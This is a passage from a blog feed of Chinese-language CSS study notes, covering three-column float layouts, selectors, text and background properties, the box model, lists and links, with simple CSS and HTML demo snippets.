class=&quot;col-extra&quot;&gt;我是附加列&lt;/div&gt;</span><br></pre></td></tr></table></figure></p><p>这样写dom，浏览器加载顺序依次为：主列、子列、附加列。<br>但是我们要的效果是左边为子列，中间为主列，右边为附加列。<br><img src="http://static.zybuluo.com/Passer6y/24pk8aju7c2dpgmu1ghhtrno/image_1d1i28aps1l9q186h1g741b54es9m.png" alt="image_1d1i28aps1l9q186h1g741b54es9m.png-112.1kB"></p><p>而且我们要的效果是左右两边盒子宽度固定，中间自适应(width:100%)，缩放页面时宽度不小于700px(给body加个最小宽度)</p><p>这里可以使用margin为负的布局，使得主列在中间，子列和附加列在左右。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.col-main&#123;</span><br><span class="line">    float: left;</span><br><span class="line">    width: 100%;</span><br><span class="line">    background:red;</span><br><span class="line">&#125;</span><br><span class="line">.col-sub&#123;</span><br><span class="line">    float: left;</span><br><span class="line">    width: 190px;</span><br><span class="line">    margin-left: -100%;</span><br><span class="line">    background:green;</span><br><span class="line">&#125;</span><br><span class="line">.col-extra&#123;</span><br><span class="line">    float: left;</span><br><span class="line">    width: 190px;</span><br><span class="line">    margin-left: -190px;</span><br><span class="line">    background: blue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;demo&quot;&gt;</span><br><span class="line">　　&lt;div class=&quot;col-main&quot;&gt;我是主列&lt;/div&gt;</span><br><span class="line">　　&lt;div class=&quot;col-sub&quot;&gt;我是子列&lt;/div&gt;</span><br><span class="line">　&lt;div class=&quot;col-extra&quot;&gt;我是附加列&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></p><p><img src="http://static.zybuluo.com/Passer6y/zfdfulgmoyu11uy83vfr934w/image_1d1i2jjb34to4bgp7117817h813.png" alt="image_1d1i2jjb34to4bgp7117817h813.png-5.8kB"></p><p>初步的布局已经成形了，但是主列的文字被子列挡住了，这时候可能会想着在主列的css上加<code>margin-left</code>，因为我们子列的布局是靠着主列的右边线定位的，直接加的话会影响到整体布局，这里有几种实现办法：</p><ol><li>在主列内建一个盒子，设置该盒子的<code>margin-left/right</code><br>demo:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">.main&#123;</span><br><span class="line">    float: left;</span><br><span class="line">    width:100%;</span><br><span class="line">    height: 600px;;</span><br><span class="line">    background: rgb(16, 149, 202);</span><br><span class="line">&#125;</span><br><span class="line">.left&#123;</span><br><span class="line">    float: left;</span><br><span class="line">    margin-left: -100%;</span><br><span class="line">    width: 200px;</span><br><span class="line">    height: 600px;</span><br><span class="line">    background: rgb(130, 47, 214);</span><br><span class="line">&#125;</span><br><span class="line">.right&#123;</span><br><span class="line">    float: left;</span><br><span class="line">    width: 200px;</span><br><span class="line">    margin-left: -200px;</span><br><span class="line">    height: 600px;</span><br><span class="line">    background: rgb(255, 217, 0);</span><br><span class="line">&#125;</span><br><span class="line">.wrap&#123;</span><br><span class="line">    margin: 0 200px;</span><br><span class="line">&#125;</span><br><span class="line">body&#123;</span><br><span class="line">    min-width: 700px;  /*设置最小宽度*/</span><br><span class="line">&#125;</span><br><span class="line">&lt;!-- 使用相对定位来解决中间盒子显示问题 --&gt;</span><br><span class="line">&lt;div class=&quot;main&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;wrap&quot;&gt;main&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;left&quot;&gt;left&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;right&quot;&gt;right&lt;/div&gt;</span><br></pre></td></tr></table></figure></li></ol><p><img src="http://static.zybuluo.com/Passer6y/2kyahtqnxrbrqwedrm9te9es/image_1d1j5fo081efj1c8ahv21nugpck9.png" alt="image_1d1j5fo081efj1c8ahv21nugpck9.png-5kB"></p><ol start="2"><li>使用相对定位<br>先给三列的父容器设置一个左右200px的padding，将三列压扁，然后给左右列设一个相对定位padding空出来的位置填满。即可让主列元素全部显示出来。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">.col-main&#123;</span><br><span class="line">    float: left;</span><br><span class="line">    width: 100%;</span><br><span class="line">    background:red;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">.col-sub&#123;</span><br><span class="line">    float: left;</span><br><span class="line">    width: 190px;</span><br><span class="line">    margin-left: -100%;</span><br><span class="line">    background:green;</span><br><span class="line">    position: relative;</span><br><span class="line">    left: -200px;</span><br><span class="line">&#125;</span><br><span class="line">.col-extra&#123;</span><br><span class="line">    float: left;</span><br><span class="line">    width: 190px;</span><br><span class="line">    margin-left: -190px;</span><br><span class="line">    background: blue;</span><br><span class="line">    position: relative;</span><br><span class="line">    right:-200px;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">.demo&#123;</span><br><span class="line">    padding: 0 200px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;div class=&quot;demo&quot;&gt;</span><br><span class="line">　　&lt;div class=&quot;col-main&quot;&gt;我是主列&lt;/div&gt;</span><br><span class="line">　　&lt;div class=&quot;col-sub&quot;&gt;我是子列&lt;/div&gt;</span><br><span class="line">　&lt;div class=&quot;col-extra&quot;&gt;我是附加列&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p><img src="http://static.zybuluo.com/Passer6y/lgbo2ojbj1rxjx1ms3y0givv/image_1d1i52mmrbte9f281q1fqok5d2d.png" alt="image_1d1i52mmrbte9f281q1fqok5d2d.png-7kB"></p><h2 id="三栏布局"><a href="#三栏布局" class="headerlink" title="三栏布局"></a>三栏布局</h2><ol><li>上述说的双飞翼(margin负值法)布局</li><li><p>绝对定位法<br>左右宽度固定，采用绝对定位，中间主体用margin撑开。<br>不好用。</p></li><li><p>自身浮动法<br>左右标签，分别左右浮动，主列标签放最后实现自适应。</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">html,body&#123;</span><br><span class="line">    height: 100%;</span><br><span class="line">    margin: 0;</span><br><span class="line">&#125;</span><br><span class="line">.left&#123;</span><br><span class="line">    width: 100px;</span><br><span class="line">    height: 100%;</span><br><span class="line">    float: left;</span><br><span class="line">    background:rgb(223, 85, 21);</span><br><span class="line">&#125;</span><br><span class="line">.middle&#123;</span><br><span class="line">    background:rgb(28, 113, 211);</span><br><span class="line">    height: 100%;</span><br><span class="line">    margin: 0 120px;</span><br><span class="line">&#125;</span><br><span class="line">.right&#123;</span><br><span class="line">    width: 100px;</span><br><span class="line">    height: 100%;</span><br><span class="line">    float: right;</span><br><span class="line">    background: rgb(27, 156, 81);</span><br><span class="line">&#125;</span><br><span class="line">&lt;div class=&quot;left&quot;&gt;left&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;right&quot;&gt;right&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;middle&quot;&gt;middle(这个一定要放最后)&lt;/div&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;接上一篇文章，学习css中踩的坑，一些小的知识点汇总，wiki的前端设计也总算是可以告一段落了，效果图：&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Code" scheme="http://0day.design/categories/Code/"/>
    
    
      <category term="Code" scheme="http://0day.design/tags/Code/"/>
    
  </entry>
  
  <entry>
    <title>CSS-前端学习记录</title>
    <link href="http://0day.design/2019/01/29/CSS-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>http://0day.design/2019/01/29/CSS-前端学习记录/</id>
    <published>2019-01-29T12:22:00.000Z</published>
    <updated>2019-02-10T09:34:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>想个小组wiki写个炫酷的前端，这半个月来一直在不断的练习前端开发，分享一些自己学习过程的记录~<br><a id="more"></a></p><h2 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h2><ol><li><p>标签选择器<br><code>p{font-size: 12px}</code></p></li><li><p>类选择器<br><code>.class{font-size: 12px}</code><br>绑定标签的class属性，可以重复</p></li><li><p>ID选择器<br><code>#id{font-size: 12px}</code><br>绑定标签的id属性，不能重复</p></li><li><p>子选择器<br><code>.food&gt;li{border:1px}</code><br>选择food类中的li标签，只能选择直接后代(第一代后代)</p></li><li><p>包含后代选择器<br><code>.first span{color:red}</code><br>即选择first类里的span标签，所有后代都可以</p></li><li><p>通用选择器<br><code>* {color: red;}</code></p></li><li>伪选择器<br><code>a:hover{color:red;}</code><br>即鼠标滑过时触发的选择器，这里使a标签里的文字变红</li><li><p>分组选择器<br><code>h1,span{color: red}</code><br>选住全部h1和span标签</p></li><li><p>相邻选择器<br><code>div+p</code> 选择紧着在<code>&lt;div&gt;</code>元素后的<code>&lt;p&gt;</code></p></li></ol><blockquote><p>注意和包含后代选择器/子选择器的区别为，它们选择的是包含在其中的元素，而+号选择器选择的是同级别关系的</p></blockquote><ol start="10"><li>通用选择器<br><code>A ~ B</code>:匹配B元素，B是A之后兄弟节点中任意一个。</li></ol><h2 id="文本样式："><a href="#文本样式：" class="headerlink" title="文本样式："></a>文本样式：</h2><ol><li>字体<br><code>font-family: &quot;宋体&quot;;</code><br><code>font-family:&quot;Microsoft Yahei&quot;;</code></li><li>字号<br><code>font-size: 12px</code><br>字体大小单位有：</li></ol><ul><li><code>px</code>：像素值，绝对单位</li><li><code>em</code>：1em相当于当前元素的父元素的大小</li><li><code>rem</code>: 1rem相对于根元素(<html>)的字体大小</html></li></ul><p>所以一般我们将<code>&lt;html&gt;</code>元素的<code>font-size</code>设为一个固定的px值，之后的段落基于rem来变化即可。</p><p>3.颜色<br><code>color: red</code></p><ol start="4"><li>粗体大小<br><code>font-weight: normal | bold | lighter | border</code></li></ol><ul><li>normal: 普通</li><li>bold: 加粗</li><li>更细或更粗</li></ul><ol start="5"><li>字体样式<br><code>font-style: normal | italic | oblique</code></li></ol><ul><li>normal: 设置为普通字体(若存在斜体则关闭)</li><li>italic: 设置斜体</li></ul><ol start="6"><li>文本装饰<br><code>text-decoration:line-through</code><br>参数：<br>none    默认。定义标准的文本。<br>underline    定义文本下的一条线。<br>overline    定义文本上的一条线。<br>line-through    定义穿过文本下的一条线。<br>blink    定义闪烁的文本。<br>inherit    规定应该从父元素继承 text-decoration 属性的值。</li></ol><p>demo：同时添加上下划线<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text-decoration: underline overline;</span><br></pre></td></tr></table></figure></p><ol start="8"><li>字体转换<br><code>text-transform: none | uppercase | lowercase | capitalize | full-width</code></li></ol><ul><li>none: 防止任何转型。</li><li>uppercase: 将所有文本转为大写。</li><li>lowercase: 将所有文本转为小写。</li><li>capitalize: 转换所有单词让其首字母大写。</li><li>full-width: 将所有字形转换成固定宽度的正方形，类似于等宽字体，允许对齐。拉丁字符以及亚洲语言字形（如中文，日文，韩文）</li></ul><ol start="9"><li><p>嵌入字体<br>加载服务端的字体文件，让浏览器可以显示用户电脑没有的字体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@font-face &#123;</span><br><span class="line">    font-family : 字体名称;</span><br><span class="line">    src : 字体文件在服务器上的相对或绝对路径;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>文本阴影<br><code>text-shadow: X-Offset Y-Offset blur color;</code><br>X-Offset：表示阴影的水平偏移距离，其值为正值时阴影向右偏移，反之向左偏移；      </p></li></ol><p>Y-Offset：是指阴影的垂直偏移距离，如果其值是正值时，阴影向下偏移，反之向上偏移；</p><p>Blur：是指阴影的模糊程度，其值不能是负值，如果值越大，阴影越模糊，反之阴影越清晰，如果不需要阴影模糊可以将Blur值设置为0；</p><p>Color：是指阴影的颜色，其可以使用rgba色。<br>demo: <code>text-shadow: 2px 2px 0 red</code></p><ol start="11"><li>文本对齐<br><code>text-align: left | right | center | justify</code><br>分别为：左对齐文本 | 右对齐 | 居中 | 使文本展开，使行宽相同</li></ol><ol start="12"><li><p>行距<br><code>line-height: 1.5</code><br>支持大多数单位，也可以无单位，作为乘数，乘以font-size。<br>一般设置为盒子模型的height值，可以起到垂直居中作用。</p></li><li><p>单词和字母间距<br><code>letter-spacing:</code><br><code>word-spacing:</code></p></li><li><p>缩进<br><code>text-indent:2em</code><br>给段落开头缩进2em，即两个文字的空白</p></li><li>行间距<br><code>line-height: 1.5em</code></li><li>字间距<br><code>letter-spacing: 50px</code></li><li>(段落)对齐<br><code>text-align: center</code></li></ol><p><strong>缩写：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">body&#123;</span><br><span class="line">    font-style:italic;</span><br><span class="line">    font-variant:small-caps; </span><br><span class="line">    font-weight:bold; </span><br><span class="line">    font-size:12px; </span><br><span class="line">    line-height:1.5em; </span><br><span class="line">    font-family:&quot;宋体&quot;,sans-serif;</span><br><span class="line">&#125;</span><br><span class="line">缩写为：</span><br><span class="line"></span><br><span class="line">body&#123;</span><br><span class="line">    font:italic  small-caps  bold  12px/1.5em  &quot;宋体&quot;,sans-serif;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="textarea标签相关属性"><a href="#textarea标签相关属性" class="headerlink" title="textarea标签相关属性"></a>textarea标签相关属性</h2><ol><li>控制元素大小可调整性：<code>resize</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/* Keyword values */</span><br><span class="line">resize: none;  /*默认*/</span><br><span class="line">resize: both;</span><br><span class="line">resize: horizontal;</span><br><span class="line">resize: vertical;</span><br><span class="line">resize: block;</span><br><span class="line">resize: inline;</span><br><span class="line"></span><br><span class="line">/* Global values */</span><br><span class="line">resize: inherit;</span><br><span class="line">resize: initial;</span><br><span class="line">resize: unset;</span><br></pre></td></tr></table></figure></li></ol><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><ol><li>基本内容<code>background</code></li></ol><ul><li>背景色: <code>background-color: red</code></li><li>背景图像：<code>background-image: url(http://img)</code></li><li>背景重复：<code>background-repeat: no-repeat | repeat-x | repreat-y | repeat</code><br>效果分别为，不重复 | 水平重复 | 垂直重复 | 都重复</li><li>背景位置：<code>background-position: px | rems | % | center | left | right | top | bottom</code></li><li><p>渐变：<code>background-image</code><br><code>background-image: linear-gradient(to bottom, yellow, orange 40%, yellow)</code><br>使用渐变函数:<code>linear-gradient()</code>传入渐变方向(to bottom | to right | to bottom right等), 渐变色。</p></li><li><p>重复渐变<br><code>background-image: repeating-linear-gradient(to right, yellow, orange 25px, yellow 50px);</code><br>0-&gt;50%，50%-&gt;100%周期渐变</p></li><li><p>背景附着：<code>background-attachment: scroll | fixed | local</code><br>内容滚动时，背景显示的效果。<br>demo:<a href="https://github.com/mdn/learning-area/tree/master/css/styling-boxes/backgrounds" target="_blank" rel="noopener">https://github.com/mdn/learning-area/tree/master/css/styling-boxes/backgrounds</a></p></li></ul><p>简写：<code>background: yellow linear-gradient(to bottom, orange, yellow) no-repeat left center scroll;</code></p><ul><li>背景大小: background-size<br><code>background-size: auto | &lt;长度值&gt; | &lt;百分比&gt; | cover | contain</code></li></ul><ul><li>auto：默认值，不改变背景图片的原始高度和宽度；<br>&lt;长度值&gt;：成对出现如200px 50px，将背景图片宽高依次设置为前面两个值，当设置一个值时，将其作为图片宽度值来等比缩放；</li></ul><ul><li>&lt;百分比&gt;：0％~100％之间的任何值，将背景图片宽高依次设置为所在元素宽高乘以前面百分比得出的数值，当设置一个值时同上；</li><li>cover：顾名思义为覆盖，即将背景图片等比缩放以填满整个容器；</li><li>contain：容纳，即将背景图片等比缩放至某一边紧贴容器边缘为止。</li></ul><ol start="2"><li><p>背景源：background-origin<br><code>background-origin:  border-box | padding-box | content-box;</code><br>参数分别表示背景图片是从边框，还是内边距（默认值），或者是内容区域开始显示。</p></li><li><p>背景剪切： background-clip<br><code>background-clip ： border-box | padding-box | content-box | no-clip</code><br>参数分别表示从边框、或内填充，或者内容区域向外裁剪背景。no-clip表示不裁切，和参数border-box显示同样的效果。backgroud-clip默认值为border-box。</p></li></ol><blockquote><p>如果要剪切成圆形，则写一个 border-radius,然后在这个盒子中赋一个背景图即可。</p></blockquote><h2 id="盒子模型"><a href="#盒子模型" class="headerlink" title="盒子模型"></a>盒子模型</h2><p>块状模型都具备盒子模型的特征</p><ol><li>盒子模型边框<br>粗细：<code>border-width: 2px</code><br>样式：<code>border-style:solid</code>,常见的值有: <code>dashed (虚线)|dotted(点线)|solid(实线)</code><br>颜色：<code>border-color: red</code></li></ol><p>可以简写为：<code>border: 2px solid red</code><br>如果只想设置底边：<code>border-bottom: 2px solid red</code>，其他边同理：<code>border-top | border-right | border-left</code></p><ol start="2"><li>边框圆角<br><code>border-radius:10px;</code><br><code>border-radius: 5px 4px 3px 2px; /*四个半径值分别是左上角、右上角、右下角和左下角，顺时针 */</code></li></ol><p>demo:半圆<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">div.circle&#123;</span><br><span class="line">    height:50px</span><br><span class="line">    width:100px;</span><br><span class="line">    background:#9da;</span><br><span class="line">    border-radius:50px 50px 0 0 ;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;div class=&quot;circle&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure></p><ol start="3"><li>边框阴影(box-shadow)<br><code>box-shadow: X轴偏移量 Y轴偏移量 [阴影模糊半径] [阴影扩展半径] [阴影颜色] [投影方式];</code><br><img src="http://static.zybuluo.com/Passer6y/pzip4o2cyt03cu3p0edd2opl/image_1d0mmuhujfbr4dp12mmc6k6aa9.png" alt="image_1d0p25k321kol1s1j1a3916t04s3p.png-113.4kB"></li></ol><p>不同浏览器适配：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">   -webkit-box-shadow:;</span><br><span class="line">-moz-box-shadow:;</span><br><span class="line">box-shadow:;</span><br></pre></td></tr></table></figure></p><ol start="4"><li>盒子模型宽和高<br><img src="http://static.zybuluo.com/Passer6y/pzip4o2cyt03cu3p0edd2opl/image_1d0mmuhujfbr4dp12mmc6k6aa9.png" alt="image_1d0mmuhujfbr4dp12mmc6k6aa9.png-205.6kB"><br><img src="http://static.zybuluo.com/Passer6y/zm54817nripf8pdwxa8jisso/image_1d0mn2q7i52u18dtu9te93g35m.png" alt="image_1d0mn2q7i52u18dtu9te93g35m.png-20.8kB"><br>几个关键参数：</li></ol><ul><li>宽：<code>width</code></li><li>填充：<code>padding</code></li><li>边框：<code>border</code></li><li>边界：<code>margin</code></li></ul><p>同样也可以设置顶底左右的距离,如：<code>padding-top</code>等等,<br>简写：<br>top、right、bottom、left值相同：<code>margin:10px 10px 10px 10px;</code> =&gt;<code>margin: 10px</code><br>top和bottom，left和right相同:<code>margin:10px 20px 10px 20px;</code>=&gt;<code>margin:10px 20px;</code></p><p>如果left和right相同：<br><code>margin:10px 20px 30px 20px;</code><br>可缩写为：<br><code>margin:10px 20px 30px;</code></p><ol start="5"><li>溢流:<br><code>overflow: auto | hidden | visible</code></li></ol><ul><li>auto: 溢出盒子的内容将被隐藏，出现滚动条</li><li>hidden: 溢出的内容隐藏</li><li>visible: 溢出的内容显示在盒子外边</li></ul><ol start="6"><li>轮廓：Outline</li></ol><ol start="7"><li><p>盒子模型：<code>box-sizing</code><br><code>box-sizing: content-box | border-box | inherit</code><br>设置成border-box后，即margin，padding这些不会再影响width和height的总长。</p></li><li><p>盒子元素类型转换<br>转换为内联元素：<code>display:inline</code><br>转化为块状元素：<code>display:block</code><br>转化为内联块状元素：<code>display: inline-block</code></p></li></ol><p>还有一些其他的显示类型：</p><ul><li><code>display: table</code>: 可以像处理table布局哪样处理非table元素。</li><li><code>display: flex</code>：可以布置一些弹性等宽容器，或者垂直居中内容等</li><li><code>display: grid</code>：css网格。</li></ul><ol start="9"><li>盒子宽和高的约束</li></ol><p>demo: 父容器在最大和最小的限制内，它将填满整个视图，父小于1280px，布局保持1280px，小于480px，则滚动才能看到全部内容。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">width: 70%</span><br><span class="line">max-width: 1280px;</span><br><span class="line">min-width: 480px;</span><br><span class="line">margin: 0 auto;  /*在父容器中上下边距为0，左右居中*/</span><br></pre></td></tr></table></figure></p><p>demo2: 将图像/视频，限制在容器内部<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">display: block;</span><br><span class="line">margin: 0 auto;</span><br><span class="line">max-width: 100%;   /*父容器缩小到小于图像宽度，图像会一起缩小*/</span><br></pre></td></tr></table></figure></p><h2 id="样式列表"><a href="#样式列表" class="headerlink" title="样式列表"></a>样式列表</h2><ol><li>列表特定样式<br>作用在<code>&lt;ul&gt;</code>和<code>&lt;ol&gt;</code>元素上：</li></ol><ul><li>列表项目符号的类型：<code>list-style-type: upper-roman | none | square</code> (大写的罗马字，或者方形符号,或者没有)</li><li>符号在列表项内还是外： <code>list-style-position: inside | outside(默认)</code></li><li>项目符号自定义图片：<code>list-style-image: url(star.svg)</code></li></ul><p>简写：<code>list-style: square url() inside;</code></p><ol start="2"><li>管理列表计数</li></ol><ul><li><p><code>start</code>：从1以外的数字开始计数<br>demo: 从4开始计数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;ol start=&quot;4&quot;&gt;</span><br><span class="line">  &lt;li&gt;4&lt;/li&gt;</span><br><span class="line">  &lt;li&gt;5&lt;/li&gt;</span><br><span class="line">  &lt;li&gt;6&lt;/li&gt;</span><br><span class="line">  &lt;li&gt;7&lt;/li&gt;</span><br><span class="line">&lt;/ol&gt;</span><br></pre></td></tr></table></figure></li><li><p><code>reversed</code>: 列表倒计数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;ol start=&quot;4&quot; reversed&gt;</span><br><span class="line">    &lt;li&gt;4&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;3&lt;/li&gt;</span><br><span class="line">&lt;/ol&gt;</span><br></pre></td></tr></table></figure></li><li><p><code>value</code>: 设置列表项指定数值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;ol&gt;</span><br><span class="line">    &lt;li value=&quot;2&quot;&gt;2&lt;/li&gt;</span><br><span class="line">    &lt;li value=&quot;10&quot;&gt;10&lt;/li&gt;</span><br><span class="line">&lt;/ol&gt;</span><br></pre></td></tr></table></figure></li></ul><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><ol><li>链接状态<br>每一个状态都对应的伪类来应用样式</li></ol><ul><li>Link(未访问过的): 默认，可以使用<code>:link</code>来应用样式</li><li>Visited:已经被访问过的，同理可以用<code>:Visited</code>伪类来应用样式</li><li>Hover：鼠标停留在链接上</li><li>Focus：被选中(如通过tab移动到这个链接)时</li><li>Active：被激活的时候(被点击)。</li></ul><blockquote><p>使用的顺序是从上到下的，因为当链接被激活的时候是选中状态的。</p></blockquote><ol start="2"><li>链接中包含图标<br>思路和之前的将列表的原点替换成图片思路一样，引入背景图标，将背景的位置设为<code>100% 0</code>右上角，设置背景的大小，然后将文字右填充<code>padding-right:</code>设成比背景大一点即可。</li></ol><p>demo:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a[href*=&quot;http&quot;]&#123;</span><br><span class="line">  background: no-repeat url(&apos;https://mdn.mozillademos.org/files/12982/external-link-52.png&apos;) 100% 0;</span><br><span class="line">  background-size: 1rem;</span><br><span class="line">  padding-right:1.2rem;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="浮动布局"><a href="#浮动布局" class="headerlink" title="浮动布局"></a>浮动布局</h2><p>让两块状元素(默认换行)并排显示(浮动效果)：<code>float:left | right</code><br>一般应用于首字下沉，或者图片被文字环绕的情景，多列浮动布局<br>demo:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">body &#123;</span><br><span class="line">  width: 90%;</span><br><span class="line">  max-width: 900px;</span><br><span class="line">  margin: 0 auto;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">div:nth-of-type(1) &#123;</span><br><span class="line">  width: 36%;</span><br><span class="line">  float: left;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">div:nth-of-type(2) &#123;</span><br><span class="line">  width: 30%;</span><br><span class="line">  float: left;</span><br><span class="line">  margin-left: 4%;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">div:nth-of-type(3) &#123;</span><br><span class="line">  width: 26%;</span><br><span class="line">  float: right;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ol start="2"><li>清除浮动<br><code>clear: left | right | both</code><br>清除左|右|全部浮动，一般出现在浮动元素下方的元素需要清除。</li></ol><ol start="3"><li>清除浮动的另一种方法<br>设置元素溢出时处理方案：<code>overflow: auto;</code></li></ol><h2 id="布局：定位"><a href="#布局：定位" class="headerlink" title="布局：定位"></a>布局：定位</h2><ol><li><p>绝对定位(position: absolute)<br>设置<code>position: absolute</code>后，然后使用<code>left | right | top | 